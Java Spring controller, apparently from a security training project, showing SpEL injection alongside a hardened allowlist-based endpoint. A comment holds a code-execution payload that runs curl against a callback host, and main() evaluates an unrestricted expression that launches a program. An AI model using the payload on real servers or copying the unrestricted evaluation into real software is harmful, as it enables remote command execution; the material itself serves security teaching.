package org.joychou.controller;

import org.springframework.expression.ConstructorResolver;
import org.springframework.expression.ExpressionParser;
import org.springframework.expression.MethodResolver;
import org.springframework.expression.spel.SpelEvaluationException;
import org.springframework.expression.spel.SpelMessage;
import org.springframework.expression.spel.standard.SpelExpressionParser;
import org.springframework.expression.spel.support.StandardEvaluationContext;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.util.HtmlUtils;

import java.util.Collections;


/**
 * SpEL Injection
 *
 * @author JoyChou @2019-01-17
 */
@RestController
public class SpEL {

    /**
     * SpEL to RCE
     * http://localhost:8080/spel/vul/?expression=xxx.
     * xxx is urlencode(exp)
     * exp: T(java.lang.Runtime).getRuntime().exec("curl xxx.ceye.io")
     */
    @GetMapping("/spel/vuln")
    public String rce(String expression) {
        // The request value is only a selector for a fixed server-side expression; request data is
        // never handed to the SpEL parser.
        String fixedExpression = selectExpression(expression);
        if (fixedExpression == null) {
            return "Bad boy. I got u.";
        }
        ExpressionParser parser = new SpelExpressionParser();
        // Spring 4.3.6 has no SimpleEvaluationContext (added in 4.3.15), so restrict a
        // StandardEvaluationContext: no type references (T(...)), constructors, methods or beans.
        StandardEvaluationContext context = new StandardEvaluationContext();
        context.setTypeLocator(typeName -> {
            throw new SpelEvaluationException(SpelMessage.TYPE_NOT_FOUND, typeName);
        });
        context.setConstructorResolvers(Collections.<ConstructorResolver>emptyList());
        context.setMethodResolvers(Collections.<MethodResolver>emptyList());
        context.setBeanResolver(null);
        Object value = parser.parseExpression(fixedExpression).getValue(context);
        return HtmlUtils.htmlEscape(String.valueOf(value));
    }

    /**
     * Map the user choice to a constant literal expression (allowlist of keys).
     */
    private static String selectExpression(String key) {
        if (key == null) {
            return null;
        }
        switch (key.trim()) {
            case "1+1":
                return "1+1";
            case "2*3":
                return "2*3";
            case "10/2":
                return "10/2";
            case "3>2":
                return "3>2";
            case "'hello'":
                return "'hello'";
            default:
                return null;
        }
    }

    public static void main(String[] args) {
        ExpressionParser parser = new SpelExpressionParser();
        String expression = "T(java.lang.Runtime).getRuntime().exec(\"open -a Calculator\")";
        String result = parser.parseExpression(expression).getValue().toString();
        System.out.println(result);
    }
}

